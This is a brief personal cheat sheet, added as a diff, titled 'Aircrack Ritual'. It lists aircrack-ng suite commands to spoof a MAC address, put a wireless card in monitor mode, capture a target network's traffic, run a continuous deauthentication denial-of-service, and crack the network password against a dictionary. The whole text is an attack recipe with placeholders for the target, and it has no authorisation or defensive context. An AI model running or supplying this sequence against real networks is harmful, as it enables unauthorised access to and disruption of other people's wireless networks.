@@ -1,0 +1,24 @@
+Aircrack Ritual
+
+ifconfig wlan0 down
+macchanger -r wlan0
+iwconfig mode monitor
+ifconfig wlan0 up
+
+airodump-ng wlan0 -- find target
+
+then 
+
+airodump-ng -c[Channel] -w[FILE] --bssid [ssid] wlan0
+
+to DOS
+
+aireplay-ng -0 0 -a [MAC] wlan0
+
+if channel is specified go iwconfig wlan0 channel [channel]
+
+PASSWORD HACKING
+
+aircrack-ng -w [path to dictionary -b [bssid of target]  [path to the capture file]
+
+
